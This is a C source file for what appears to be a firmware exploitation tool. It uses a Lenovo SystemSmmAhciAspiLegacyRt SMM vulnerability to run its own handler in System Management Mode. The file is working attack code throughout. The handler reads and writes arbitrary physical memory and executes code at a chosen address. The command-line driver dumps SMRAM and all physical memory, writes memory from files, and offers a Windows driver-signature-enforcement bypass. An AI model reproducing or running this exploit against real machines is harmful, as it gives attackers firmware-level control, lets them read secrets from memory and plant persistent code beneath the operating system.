#include "stdafx.h"

#if !defined(strtoull)

// fucking Microsoft
#define strtoull _strtoui64

#endif

// make crt functions inline
#pragma intrinsic(memcpy)

#define PAGE_SIZE_2MB (2 * 1024 * 1024)

// SMM related model specific registers of Intel
#define IA32_SMRR_PHYSBASE  0x000001F2  // SMRR base address
#define IA32_SMRR_PHYSMASK  0x000001F3  // SMRR range mask
#define IA32_MTRRCAP        0x000000FE  // MTRR capabilities

// sysenter related model specific registers
#define IA32_SYSENTER_CS    0x00000174
#define IA32_SYSENTER_EIP   0x00000176
#define IA32_SYSENTER_ESP   0x00000175

// syscall related model specific registers
#define IA32_LSTAR          0xc0000082

// commands to smm_handler()
#define SMM_OP_NONE             0   // do nothing, just check for successful exploitation
#define SMM_OP_PHYS_MEM_READ    1   // read physical memory from SMM
#define SMM_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
#define SMM_OP_PHYS_PAGE_READ   3   // read physical memory from SMM using page table remap
#define SMM_OP_PHYS_PAGE_WRITE  4   // write physical memory from SMM using page table remap
#define SMM_OP_EXECUTE          5   // execute SMM code at specified physical address
#define SMM_OP_GET_SMRAM_ADDR   6   // return SMRAM region address
#define SMM_OP_GET_MEM_INFO     7   // return physical memory information

// default size for TSEG/HSEG
#define SMRAM_SIZE 0x800000

// Top of Memory
#define MEM_TOM PCI_ADDR(0, 0, 0, 0xa0)

// Top of Low Usable DRAM
#define MEM_TOLUD PCI_ADDR(0, 0, 0, 0xbc)

// Top of Upper Usable DRAM
#define MEM_TOUUD PCI_ADDR(0, 0, 0, 0xa8)

typedef void (* SMM_PROC)(void);

#ifdef USE_RWDRV

// RWEverything driver can allocate only relatively small chunks of contiguous physical memory
#define MEM_IO_BUFF_LEN (PAGE_SIZE * 4)

#else

#define MEM_IO_BUFF_LEN PAGE_SIZE_2MB

#endif

typedef struct _SMM_HANDLER_CONTEXT
{
    unsigned int op;
    int status;    

    union
    {
        struct // for SMM_HANDLER_OP_PHYS_MEM_READ, SMM_HANDLER_OP_PHYS_MEM_WRITE, etc.
        {
            void *addr;
            unsigned int size;
            unsigned char data[];

        } phys_mem;

        struct // for SMM_HANDLER_OP_EXECUTE
        {
            SMM_PROC addr;

        } execute;

        struct // for SMM_HANDLER_OP_GET_SMRAM_ADDR
        {
            unsigned long long addr;

        } smram_addr;
    };

} SMM_HANDLER_CONTEXT,
*PSMM_HANDLER_CONTEXT;
//--------------------------------------------------------------------------------------
// put SMM function into the separate executable section
#pragma code_seg("_SMM")

static void smm_handler(void *context)
{
    int status = -1;
    PSMM_HANDLER_CONTEXT handler_context = (PSMM_HANDLER_CONTEXT)context;

    if (handler_context->op == SMM_OP_NONE)
    {
        // do nothing
        status = 0;
    }
    else if (handler_context->op == SMM_OP_PHYS_MEM_READ)
    {
        // read physical memory
        memcpy(
            &handler_context->phys_mem.data,
            handler_context->phys_mem.addr,
            handler_context->phys_mem.size
        );

        status = 0;
    }
    else if (handler_context->op == SMM_OP_PHYS_MEM_WRITE)
    {
        // write physical memory
        memcpy(
            handler_context->phys_mem.addr,
            &handler_context->phys_mem.data,
            handler_context->phys_mem.size
        );

        status = 0;
    }    
    else if (handler_context->op == SMM_OP_PHYS_PAGE_READ ||
             handler_context->op == SMM_OP_PHYS_PAGE_WRITE)
    {
        unsigned long long cr3 = _cr3_get(), addr = 0;
        unsigned long long mem_addr = (unsigned long long)handler_context->phys_mem.addr;

        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry =
            (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)(PML4_ADDRESS(cr3) + 
            PML4_INDEX(addr) * sizeof(unsigned long long));

        if (PML4_entry->Bits.Present)
        {
            X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry =
                (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)(PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress) +
                PDPT_INDEX(addr) * sizeof(unsigned long long));

            if (PDPT_entry->Bits.Present)
            {
                // check for page size flag
                if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
                {
                    X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry =
                        (X64_PAGE_DIRECTORY_ENTRY_4K *)(PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress) +
                        PDE_INDEX(addr) * sizeof(unsigned long long));

                    if (PD_entry->Bits.Present)
                    {                        
                        // check for page size flag
                        if (PD_entry->Uint64 & PDPTE_PDE_PS)
                        {                                                                         
                            unsigned long long new_addr = XALIGN_DOWN(mem_addr, (1024 * 1024 * 2));                                                     
                            unsigned long long old_pfn = PD_entry->Bits.PageTableBaseAddress;
                            unsigned long long offset = mem_addr - new_addr;                                            

                            // set new PFN to map target physical page to virtual address space at 0x1000000
                            PD_entry->Bits.PageTableBaseAddress = PAGE_TO_PFN(new_addr);
                                                        
                            // flush TLB
                            _invlpg(addr);

                            if (handler_context->op == SMM_OP_PHYS_PAGE_READ)
                            {
                                // read physical memory page
                                memcpy(
                                    &handler_context->phys_mem.data, 
                                    (unsigned char *)addr + offset,
                                    min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset)
                                );
                            }
                            else
                            {
                                // write physical memory page
                                memcpy(
                                    (unsigned char *)addr + offset,
                                    &handler_context->phys_mem.data,
                                    min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset)
                                );
                            }
                            
                            // restore old PFN
                            PD_entry->Bits.PageTableBaseAddress = old_pfn;
                            status = 0;

                            // flush TLB
                            _invlpg(addr);
                        }
                        else
                        {
                            status = 5;
                        }
                    }
                    else
                    {
                        status = 4;
                    }
                }
                else
                {
                    status = 3;
                }
            }
            else
            {
                status = 2;
            }
        }
        else
        {
            status = 1;
        }
    }
    else if (handler_context->op == SMM_OP_EXECUTE)
    {
        // run specified code
        if (handler_context->execute.addr)
        {
            handler_context->execute.addr();
        }

        status = 0;
    }
    else if (handler_context->op == SMM_OP_GET_SMRAM_ADDR)
    {
        // calculate SMRAM address by stack pointer value
        handler_context->smram_addr.addr = (unsigned long long)&status;
        handler_context->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);

        status = 0;
    }

    handler_context->status = status;    
}

#pragma code_seg()
//--------------------------------------------------------------------------------------
int test(void)
{
    int ret = -1;

    printf("**************************************\n");
    printf("Running tests...\n");

    /*
        Test physical memory read and write.
    */
    {
        unsigned long long addr = 0x1000, old = 0;
        unsigned long long val = 0x0807060504030201;

        if (!uefi_expl_phys_mem_read(addr, sizeof(old), (unsigned char *)&old))
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            goto _end;
        }

        printf(__FUNCTION__"(): Old value from 0x%llx is 0x%llx\n", addr, old);

        if (uefi_expl_phys_mem_write(addr, sizeof(val), (unsigned char *)&val))
        {
            unsigned int low = 0, high = 0;

            if (uefi_expl_phys_mem_read(addr, sizeof(low), (unsigned char *)&low) &&
                uefi_expl_phys_mem_read(addr + 4, sizeof(high), (unsigned char *)&high))
            {
                printf(__FUNCTION__"(): Readed values are 0x%.8x`%.8x\n", high, low);

                if (high == 0x08070605 && low == 0x04030201)
                {
                    ret = 0;
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            }

            // restore overwritten memory
            uefi_expl_phys_mem_write(addr, sizeof(old), (unsigned char *)&old);
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_write() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #1\n");
        goto _end;
    }

    /*
        Test PCI config space and I/O ports API.
    */
    ret = -1;

    {
        unsigned int pci_addr = PCI_ADDR(0, 0, 0, 0);
        unsigned long long val = 0;

        val |= pci_addr;

        // read VID/DID of PCI device 00:00.0 (host bridge) manually using I/O ports
        if (uefi_expl_port_write(0xcf8, U32, val))
        {
            val = 0;

            if (uefi_expl_port_read(0xcfc, U32, &val))
            {
                unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
                               did = (unsigned short)((val >> 16) & 0xffff);

                printf(__FUNCTION__"(): Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);

                val = 0;

                if (uefi_expl_pci_read(pci_addr, U32, &val))
                {
                    if (vid == (unsigned short)((val >> 0) & 0xffff) &&
                        did == (unsigned short)((val >> 16) & 0xffff))
                    {
                        ret = 0;
                    }
                }
                else
                {
                    printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_port_read() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_port_write() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #2\n");
        goto _end;
    }

    /*
        Test memory alloc/free and virtual to physical address translation.
    */
    ret = -1;

    {
        unsigned long long addr = 0, phys_addr = 0;

        if (uefi_expl_mem_alloc(PAGE_SIZE, &addr, &phys_addr))
        {
            unsigned long long phys_addr_2 = 0;

            printf(__FUNCTION__"(): Memory allocated at address 0x%llx\n", addr);

            if (uefi_expl_phys_addr(addr, &phys_addr_2))
            {
                printf(__FUNCTION__"(): Physical address for 0x%llx is 0x%llx\n", addr, phys_addr_2);

                if (phys_addr == phys_addr_2)
                {
                    ret = 0;
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
            }

            if (!uefi_expl_mem_free(addr, PAGE_SIZE))
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_mem_free() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_mem_alloc() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #3\n");
        goto _end;
    }

    /*
        Test model specific registers.
    */
    ret = -1;

    {
        unsigned long long val_1 = 0, val_2 = 0;

        if (uefi_expl_msr_get(IA32_LSTAR, &val_1) && uefi_expl_msr_get(IA32_SYSENTER_EIP, &val_2))
        {
            printf(__FUNCTION__"(): IA32_LSTAR = 0x%llx\n", val_1);
            printf(__FUNCTION__"(): IA32_SYSENTER_EIP = 0x%llx\n", val_2);

            ret = 0;
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #4\n");
        goto _end;
    }

_end:

    printf("TEST %s\n", (ret == 0) ? "SUCCESS" : "FAILS");
    printf("*****************************************\n");

    return ret;
}
//--------------------------------------------------------------------------------------
#pragma optimize("", off)

static void smm_image_section_workaround(void)
{
    /*
        smm_handler() and other functions that being executed in SMM
        are stored in separate executable image section "_SMM". Windows
        will copy contents of this section into the physical memory only 
        after the first access to it's virtual memory pages.
    */
    unsigned char foo = *(unsigned char *)&smm_handler;
}

#pragma optimize("", on)
//--------------------------------------------------------------------------------------
int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT context, unsigned int context_size, bool quiet)
{
    int ret = -1;
    unsigned long long addr = 0, phys_addr = 0;

    if (context_size == 0)
    {
        context_size = sizeof(SMM_HANDLER_CONTEXT);
    }

    context->status = -1;

    smm_image_section_workaround();

    // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
    if (uefi_expl_mem_alloc(context_size, &addr, &phys_addr))
    {
        if (uefi_expl_phys_mem_write(phys_addr, context_size, (unsigned char *)context))
        {
            // run exploit
            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, custom_target, smm_handler, (void *)phys_addr, quiet))
            {
                // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
                if (uefi_expl_phys_mem_read(phys_addr, context_size, (unsigned char *)context))
                {                    
                    if (context->status == 0)
                    {
                        ret = 0;
                    }
                    else
                    {
                        printf("ERROR: smm_handler() returned status code %d\n", context->status);
                    }
                }
                else
                {
                    printf("ERROR: uefi_expl_mem_read() fails\n");
                }
            }
        }
        else
        {
            printf("ERROR: uefi_expl_mem_write() fails\n");
        }

        uefi_expl_mem_free(addr, context_size);
    }
    else
    {
        printf("ERROR: uefi_expl_mem_alloc() fails\n");
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int phys_mem_read(
    int target, PUEFI_EXPL_TARGET custom_target, 
    void *addr, unsigned long long size, unsigned char *data, 
    const char *file_path)
{
    int ret = -1;
    int chunk_size = MEM_IO_BUFF_LEN;
    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
    unsigned long long total = 0;

    PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
    if (context == NULL)
    {
        return -1;
    }

    FILE *f = NULL;

    if (file_path)
    {
        // create output file
        if ((f = fopen(file_path, "wb")) == NULL)
        {
            printf("ERROR: Unable to create output file \"%s\"\n", file_path);
            goto _end;
        }
    }

    memset(context, 0, context_size);
    context->op = SMM_OP_PHYS_PAGE_READ;

    for (unsigned long long p = 0; p < size; p += chunk_size)
    {
        unsigned int data_size = min(chunk_size, size - p);
    
        context->phys_mem.addr = (unsigned char *)addr + p;
        context->phys_mem.size = data_size;

        // read single chunk of memory
        if (exploit(target, custom_target, context, context_size, true) != 0)
        {
            printf("ERROR: exploit() fails\n");
            goto _end;
        }

        if (data)
        {
            // copy readed data to buffer
            memcpy(data + p, context->phys_mem.data, data_size);
        }

        if (f)
        {
            // write readed data to file
            if (fwrite(context->phys_mem.data, 1, data_size, f) != data_size)
            {
                printf("ERROR: fwrite() fails\n");
                goto _end;
            }
        }

        if (data == NULL && f == NULL)
        {
            // print memory dump to the console
            hexdump(context->phys_mem.data, data_size, (unsigned long long)addr + p);
        }

        total += data_size;
    }

    ret = 0;

_end:

    if (f)
    {
        if (ret == 0)
        {
            printf("%lld bytes written to the \"%s\"\n", total, file_path);
        }        

        fclose(f);
    }

    free(context);

    return ret;
}
//--------------------------------------------------------------------------------------
int phys_mem_write(
    int target, PUEFI_EXPL_TARGET custom_target, 
    void *addr, unsigned long long size, unsigned char *data, 
    const char *file_path)
{
    int ret = -1;
    int chunk_size = MEM_IO_BUFF_LEN;
    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
    unsigned long long total = 0;

    if (data == NULL && file_path == NULL)
    {
        return -1;
    }

    PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
    if (context == NULL)
    {
        return -1;
    }

    FILE *f = NULL;

    if (file_path)
    {

#ifdef WIN32

        struct _stat file_info;

        // get file info on Windows
        if (_stat(file_path, &file_info) != 0)
#else
        struct stat file_info;

        // get file info on *nix
        if (stat(file_path, &file_info) != 0)
#endif
        {
            printf("ERROR: stat() fails for file \"%s\"\n", file_path);
            return -1;
        }

        if (file_info.st_size == 0)
        {
            printf("ERROR: \"%s\" file is empty\n", file_path);
            return -1;
        }

        // open input file
        if ((f = fopen(file_path, "rb")) == NULL)
        {
            printf("ERROR: Unable to open input file \"%s\"\n", file_path);
            goto _end;
        }

        size = file_info.st_size;
    }

    memset(context, 0, context_size);
    context->op = SMM_OP_PHYS_PAGE_WRITE;

    for (unsigned long long p = 0; p < size; p += chunk_size)
    {
        unsigned int data_size = min(chunk_size, size - p);

        context->phys_mem.addr = (unsigned char *)addr + p;
        context->phys_mem.size = data_size;

        if (file_path)
        {
            // read data from file
            if (fread(context->phys_mem.data, 1, data_size, f) != data_size)
            {
                printf("ERROR: fread() fails\n");
                goto _end;
            }
        }
        else if (data)
        {
            // copy data from buffer
            memcpy(context->phys_mem.data, data + p, data_size);
        }

        // write single chunk of memory
        if (exploit(target, custom_target, context, context_size, true) != 0)
        {
            printf("ERROR: exploit() fails\n");
            goto _end;
        }

        total += data_size;
    }

    ret = 0;

_end:

    if (f)
    {
        if (ret == 0)
        {
            printf("%lld bytes written from the \"%s\"\n", total, file_path);
        }

        fclose(f);
    }

    free(context);

    return ret;
}
//--------------------------------------------------------------------------------------
unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
{

#ifdef USE_SMRR

    unsigned long long val = 0;
    
    if (uefi_expl_msr_get(IA32_MTRRCAP, &val))
    {
        // check if IA32_SMRR_PHYSBASE and IA32_SMRR_PHYSMASK are available (11 bit)
        if (val & 0x800 == 0)
        {
            printf(__FUNCTION__"() ERROR: SMRR is not supported on this system\n");
            return 0;
        }

        if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &val))
        {
            // get PhysBase field of IA32_SMRR_PHYSBASE, bits 12 through 31
            return val & 0xFFFFF000;
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
        }
    }
    else
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
    }    
 
#else // USE_SMRR

    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));
    context.op = SMM_OP_GET_SMRAM_ADDR;

    // run exploitation to get SMRAM address
    if (exploit(target, custom_target, &context, NULL, false) == 0)
    {
        return context.smram_addr.addr;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: exploit() fails\n");
    }

#endif // USE_SMRR

    return 0;
}
//--------------------------------------------------------------------------------------
int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_path)
{
    int ret = -1;
    unsigned long long TOUUD = 0, TOLUD = 0;
    unsigned char *buff = NULL;
    unsigned int buff_size = PAGE_SIZE_2MB;
    FILE *f = NULL;

    if (!uefi_expl_pci_read(MEM_TOUUD, U64, &TOUUD))
    {
        goto _end;
    }

    if (!uefi_expl_pci_read(MEM_TOLUD, U32, &TOLUD))
    {
        goto _end;
    }

    // clear lock bits
    TOLUD &= ~1;
    TOUUD &= ~1;

    unsigned long long TSEG = smram_addr(target, custom_target);
    if (TSEG == 0)
    {
        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
        goto _end;
    }

    printf(" TSEG = "IFMT64"\n", TSEG);

    if (!((TSEG & (buff_size - 1)) == 0 && TSEG < 0x100000000))
    {
        printf("ERROR: Invalid TSEG address\n");
    }    
    
    printf("TOLUD = "IFMT64"\n", TOLUD);

    if (!((TOLUD & (buff_size - 1)) == 0 && TOLUD > TSEG + SMRAM_SIZE && TOLUD < 0x100000000))
    {
        printf("ERROR: Invalid TOLUD value\n");
        goto _end;
    }

    printf("TOUUD = "IFMT64"\n", TOUUD);      

    if (!((TOUUD & (buff_size - 1)) == 0 && TOUUD > 0x100000000 && TOUUD < 0xfffff80000000000))
    {
        printf("ERROR: Invalid TOUUD value\n");
        goto _end;
    }    

    // create output file
    if ((f = fopen(file_path, "wb")) == NULL)
    {
        printf("ERROR: Unable to create output file \"%s\"\n", file_path);
        goto _end;
    }    

    // allocate I/O buffer
    if ((buff = (unsigned char *)malloc(buff_size)) == NULL)
    {
        goto _end;
    }

    // dump low usable dram
    for (unsigned long long addr = 0; addr < TSEG + SMRAM_SIZE; addr += buff_size)
    {
        printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);

        // read snigle chunk of memory
        if (phys_mem_read(target, custom_target, (void *)addr, buff_size, buff, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            goto _end;
        }

        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }

        fflush(f);
    }    

    memset(buff, 0, buff_size);

    // fill memory range from TOLUD to 0xffffffff with zeros
    for (unsigned long long addr = TSEG + SMRAM_SIZE; addr < 0x100000000; addr += buff_size)
    {
        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }
    }

    fflush(f);

    // dump high usable dram
    for (unsigned long long addr = 0x100000000; addr < TOUUD; addr += buff_size)
    {
        printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);

        // read snigle chunk of memory
        if (phys_mem_read(target, custom_target, (void *)addr, buff_size, buff, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            goto _end;
        }

        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }

        fflush(f);
    }

    ret = 0;

_end:

    if (buff)
    {
        free(buff);
    }

    if (f)
    {
        fclose(f);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    int ret = -1, target = -1;
    unsigned long long length = 0;        
    const char *data_file = NULL;
    void *mem_read = NULL, *mem_write = NULL;
    bool use_dse_bypass = false, use_test = false, use_smram_dump = false, use_mem_dump = false;
    
    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));
    context.op = SMM_OP_NONE;

    UEFI_EXPL_TARGET custom_target;
    memset(&custom_target, 0, sizeof(custom_target));
    custom_target.smi_num = -1;    

    // parse command line options
    for (int i = 1; i < argc; i++)
    {
        if (!strcmp(argv[i], "--exec") && i < argc - 1)
        {
            context.op = SMM_OP_EXECUTE;

            // execute SMM code at given physical addres
            context.execute.addr = (SMM_PROC)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-read") && i < argc - 1)
        {
            // read memory (one page by default)
            mem_read = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-write") && i < argc - 1)
        {
            context.op = SMM_OP_PHYS_MEM_WRITE;

            // write memory (--file option is mandatory)
            mem_write = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-dump"))
        {
            // dump physical memory
            use_mem_dump = true;
        }
        else if (!strcmp(argv[i], "--length") && i < argc - 1)
        {
            // memory read/write length
            length = strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid length specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target") && i < argc - 1)
        {
            // update target model number
            target = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid target number specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-addr") && i < argc - 1)
        {
            /* 
                Address of EFI_BOOT_SERVICES.LocateProtocol field that necessary for 
                SystemSmmAhciAspiLegacyRt vulnerability exploitation.
            */
            custom_target.addr = strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid EFI_BOOT_SERVICES.LocateProtocol address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-smi") && i < argc - 1)
        {
            // SMI handler number for SystemSmmAhciAspiLegacyRt vulnerability exploitation
            custom_target.smi_num = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid SMI handler number specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-list"))
        {
            // print available targets and exit
            expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info();
            return 0;
        }
        else if (!strcmp(argv[i], "--file") && i < argc - 1)
        {
            // use file to read or write SMRAM data
            data_file = argv[i + 1];

            i += 1;
        }
        else if (!strcmp(argv[i], "--dse-bypass"))
        {
            // bypass Windows x64 DSE
            use_dse_bypass = true;
        }        
        else if (!strcmp(argv[i], "--test"))
        {
            // run libfwexpl tests
            use_test = true;
        }
        else if (!strcmp(argv[i], "--smram-dump"))
        {
            // dump SMRAM contents
            use_smram_dump = true;
        }
        else
        {
            printf("ERROR: Unknown option %s\n", argv[i]);
            return -1;
        }
    }    

#ifdef USE_RWDRV

    if (use_dse_bypass)
    {
        printf(
            "ERROR: --dse-bypass option is not valid for this version of the tool "
            "because it imlements libfwexpl API using digitally signed RWEveryting "
            " driver. If you want to use DSE bypass kernel driver exploit that loads "
            "our own unsigned driver -- please disable USE_RWDRV in config.h and "
            "recompie the program.\n"
        );

        return -1;
    }

#endif // USE_RWDRV

    if (use_smram_dump && data_file == NULL)
    {
        printf("ERROR: --file is required for --smram-dump\n");
        return -1;
    }

    if (use_mem_dump && data_file == NULL)
    {
        printf("ERROR: --file is required for --phys-mem-dump\n");
        return -1;
    }

    if (mem_read && length == 0)
    {
        printf("ERROR: --length is required for --phys-mem-read\n");
        return -1;
    }

    if (mem_write && data_file == NULL)
    {
        printf("ERROR: --file is required for --phys-mem-write\n");
        return -1;
    }

    // initialize HAL
    if (uefi_expl_init(NULL, use_dse_bypass))
    {    
        unsigned long long val = 0;               

        if (use_test)
        {
            // run tests and exit
            ret = test();
        }
        else if (uefi_expl_pci_read(PCI_ADDR(0, 0, 0, 0), U32, &val))
        {
            unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
                           did = (unsigned short)((val >> 16) & 0xffff);

            printf("Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);           
            
            // check for Intel VID
            if (vid == 0x8086)
            {            

#ifdef WIN32
                SetThreadAffinityMask(GetCurrentThread(), 1);
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);                                
#else
                // ...
#endif
                if (mem_read)
                {
                    // read memory contents
                    ret = phys_mem_read(target, &custom_target, mem_read, length, NULL, data_file);
                }
                else if (mem_write)
                {
                    // write memory contents
                    ret = phys_mem_write(target, &custom_target, mem_write, length, NULL, data_file);
                }
                else if (use_mem_dump)
                {
                    // dump all of the memory contents to file
                    ret = phys_mem_dump(target, &custom_target, data_file);
                }
                else
                {
                    unsigned long long addr = 0;

                    if (use_smram_dump)
                    {
                        // get current SMRAM address
                        if (addr = smram_addr(target, &custom_target))
                        {
                            printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);

                            // read SMRAM contents
                            ret = phys_mem_read(target, &custom_target, (void *)addr, SMRAM_SIZE, NULL, data_file);
                        }
                        else
                        {
                            printf("ERROR: Unable to determinate SMRAM address\n");
                        }                        
                    }
                    else
                    {
                        // run exploitation
                        ret = exploit(target, &custom_target, &context, 0, false);
                    }
                }
#ifdef WIN32
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
#else
                // ...
#endif
            }
            else
            {
                printf("ERROR: Unsupported platform\n");
            }
        }               
        else
        {
            printf("ERROR: uefi_expl_pci_read() fails\n");
        }
_end:
        // uninitialize HAL
        uefi_expl_uninit();
    }
    else
    {
        printf("ERROR: uefi_expl_init() fails\n");
    }

    printf("Press any key to quit...\r\n");
    getch();

    ExitProcess(0);

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
